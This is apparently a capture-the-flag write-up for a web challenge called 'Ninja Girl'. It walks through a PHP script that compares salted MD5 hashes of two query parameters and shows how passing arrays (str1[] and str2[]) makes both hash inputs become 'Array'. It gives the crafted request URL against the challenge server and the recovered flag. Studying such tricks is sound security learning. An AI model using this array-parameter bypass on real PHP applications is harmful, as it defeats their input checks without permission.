# Ninja Girl

__PROBLEM__

NInJa_gIrl thinks MD5 is amazing.She uses one salt to hash all her data. All you need to do is enter two different names and prove her that she’s wrong?
[Link to the Challenge](http://104.248.49.223:7075/)

Here is the source code: [link](https://ghostbin.com/paste/seah6)
Flag is in format: Glug{}

__PROBLEM__

We start by checking out the source that is given to us
```php
<?php include 'secret.php';
if($_GET["str1"] and $_GET["str2"]) {
    if ($_GET["str1"] !== $_GET["str2"] and hash("md5", $salt . $_GET["str1"]) === hash("md5", $salt . $_GET["str2"])) {
     echo $flag; }
    else {
        echo "Sorry, you're wrong."; }
        exit();
} ?>
```
There are few conditions related to the two strings that you have to entered are:
1) `if($_GET["str1"] and $_GET["str2"])` : None of the field must be left empty
2) `$_GET["str1"] !== $_GET["str2"` : Both the strings must be different
3) `hash("md5", $salt . $_GET["str1"]) === hash("md5", $salt . $_GET["str2"]))`
    Hash of both the strings must be same.

Here the problem is with hashing. This problem can simply done just by putting arrays instead of plain text. You can try this by testing as follows:
```php
php > $salt = "test";
php > $array[] = 1;
php > $array2[] = 2;
php > echo($salt . $array);
PHP Notice:  Array to string conversion in php shell code on line 1
testArray
php > echo($salt . $array2);
PHP Notice:  Array to string conversion in php shell code on line 1
testArray
```

As you can see we get the same result for both. Now let's do the same thing with our strings.
our new URL will be `http://104.248.49.223:7075/?str1[]=1d&str2[]=2`

FLAG - `Glug{7i5e_1s_####123_7577}`
